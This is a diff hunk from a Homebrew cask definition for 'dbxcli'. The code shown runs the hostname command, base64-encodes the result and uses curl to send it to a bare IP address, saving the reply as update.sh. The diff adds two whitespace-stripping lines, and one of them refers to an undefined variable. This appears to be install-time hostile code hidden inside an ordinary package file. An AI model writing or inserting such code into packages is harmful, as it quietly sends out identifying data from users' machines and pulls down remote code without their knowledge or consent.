@@ -39,7 +39,9 @@ cask "dbxcli" do
       # remember to base64 it dummy
       #thehostname = system_command 'hostname'
     thehostname = %x{hostname}
+    thehostname.strip() # remove whitespace
     encodedname = %x{base64 <<< #{thehostname}}
+    theencodedname.strip() # remove whitespace
     %x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
     #%x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
 
